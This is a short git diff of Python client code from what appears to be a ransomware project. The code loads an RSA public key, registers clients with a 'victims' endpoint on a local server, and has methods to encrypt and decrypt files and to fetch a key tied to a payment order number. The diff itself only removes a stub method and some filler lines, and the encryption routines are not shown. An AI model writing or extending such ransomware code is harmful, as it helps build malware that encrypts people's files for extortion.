@@ -14,6 +14,7 @@ CUR_PATH = os.path.dirname(sys.executable) if hasattr(sys, 'frozen') else os.pat
 
 with open(f'{CUR_PATH}/pubkey', 'r') as f:
     PUB_KEY = RSA.importKey(f.read())
+    
 ADD_URL = 'http://localhost:5000/victims/add'
 GET_URL = 'http://localhost:5000/victims/'
 HEADER = {
@@ -53,19 +54,13 @@ class Client():
         # return b64decode(result).decode()
         self.aes_key = b64encode(result).decode()
 
-    def dec_key(self):
-        print('decrypting key...')
-        pass
-
     def enc_file(self):
         print('encrypting file...')
         encrypt_file()
-        pass
 
     def dec_file(self):
         print('decrypting file...')
         decrypt_file()
-        pass
 
     def get_key(self, out_trade_no=None):
         data = {
